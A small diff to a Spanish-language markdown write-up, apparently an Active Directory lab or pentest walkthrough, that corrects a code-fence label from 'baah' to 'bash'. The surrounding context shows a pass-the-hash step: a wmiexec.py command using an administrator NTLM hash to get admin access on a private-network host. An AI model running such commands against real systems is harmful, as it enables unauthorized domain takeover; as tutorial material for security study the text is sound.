@@ -168,7 +168,7 @@ de la cuenta del equipo vacía.
 
 Y efectívamente, todo ha vuelto a la normalidad, pero seguimos teniendo acceso al equipo como administrador del dominio porque seguimos teniendo el hash de la contraseña de la cuenta del administrador para hacer pass the hash.
 
-```baah
+```bash
 wmiexec.py -hashes :57987b38d5ba54e02daa2d5d7579765b Administrador@192.168.160.131
 ```
 
